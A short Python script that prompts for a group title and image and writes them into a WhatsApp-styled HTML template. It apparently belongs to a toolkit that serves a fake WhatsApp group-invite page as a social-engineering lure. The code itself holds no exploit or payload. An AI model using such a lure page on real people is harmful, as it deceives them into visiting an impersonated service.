#!/usr/bin/env python3

import os
import shutil
import quo


quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False)
quo.echo(" Group Title", fg="vcyan", nl=False)
title = quo.prompt("")
quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False)
quo.echo(f" Path to Group Image", fg="vcyan", nl=False)
quo.echo(f" (Ideal image size is 300x300)", fg="vred", nl=False)
image = quo.prompt("")

img_name = image.split('/')[-1]
try:
    shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
except Exception as e:
    print('\n' + '[-]' + ' Exception : ' + str(e))
    exit()

with open('template/whatsapp/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w') as new_index:
    new_index.write(code)
